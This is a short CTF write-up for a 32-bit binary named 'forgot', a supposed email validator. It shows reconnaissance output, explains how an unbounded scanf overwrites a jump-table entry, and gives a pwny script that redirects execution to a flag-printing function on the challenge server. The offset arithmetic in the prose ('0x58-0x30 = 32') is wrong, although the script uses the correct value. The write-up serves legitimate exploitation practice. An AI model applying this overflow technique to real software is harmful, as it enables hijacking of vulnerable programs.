Title: forgot
Author: doskop
Date: 2015-04-03 11:36
Tags: CTF


## Introduction

> Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.

> Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed here.

Not going to spend too much time on this write-up, it's rather simple really.

## Analysis

    $ file forgot
    forgot: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped
    
    $ readelf -hl forgot|egrep "Type|GNU_STACK"
    Type: EXEC (Executable file)
    Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align
    GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10

Non executable stack, no symbols. Let's poke it and see what it does.

    $ ./forgot 
    What is your name?
    > CED
    
    Hi CED
    
    
                Finite-State Automaton
    
    I have implemented a robust FSA to validate email addresses
    Throw a string at me and I will let you know if it is a valid email address
    
                    Cheers!
    
    I should give you a pointer perhaps. Here: 8048654
    
    Enter the string to be validate
    > CED
    Dude, you seriously think this is going to work. Where are the fancy @ and [dot], huh?

## Exploitation

Ok, it leaks a pointer to the code segment. That's good fun and all but pretty useless. Let's open it up in a disassembler and browse around for a bit. You'll notice a function that calls system("cat ./flag") at 0x080486cc so that's probably where we want to end up.

Now let's look at the main function. It starts by setting up a jump table at esp+0x30 starting with a function that prints an error message about the email address not containing an '@' symbol. It uses fgets to read your name to esp+0x58 at a maximum of 0x20 characters, that's not very useful. It uses scanf("%s") to read the email address to esp+0x10. We can use that to overwrite the first entry of the jump table at esp+0x30 and jump to the flag reading function.

So, we first write 0x58-0x30 = 32 bytes of A's and then the pointer value of the flag reading function.

    #!/usr/bin/env python
    from pwny import *
    target.assume(ELF('forgot'))
    
    #f = Flow.execute('./forgot')
    f = Flow.connect_tcp('hack.bckdr.in', 8009)
    f.until('\n> ')
    f.writeline('CED')
    f.until('\n> ')
    f.writeline('A' * 32 + P(0x080486cc))
    f.read_eof(echo=True)
